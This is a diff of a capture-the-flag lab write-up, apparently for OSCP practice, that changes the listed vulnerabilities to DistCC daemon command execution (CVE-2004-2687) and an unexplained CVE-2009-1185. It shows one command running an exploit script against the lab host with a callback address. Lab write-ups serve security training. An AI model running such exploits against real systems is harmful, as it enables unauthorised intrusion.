@@ -5,7 +5,8 @@ Machine IP: 10.10.10.3 - Linux
 Difficulty: Easy
 Category: OSCP Preparation
 Vulmerabilities:
-  - CVE-2011-2523: vsftpd 2.3.4 - Backdoor Command Execution
+  - CVE-2004-2687: DistCC Daemon Command Execution
+  - CVE-2009-1185: 
 ```
 
 # Reconnaissance
@@ -150,7 +151,7 @@ Nmap done: 1 IP address (1 host up) scanned in 53.82 seconds
 
 ## Initial Foothold
 ## DistCC Daemon Command Execution (CVE-2004-2687)
-  - Exploit 
+  - Exploit (in my exploits repository).
 
 ```CSS
 ▶ python CVE-2004-2687-Exploit.py --rhost 10.10.10.3 --lhost 10.10.14.24
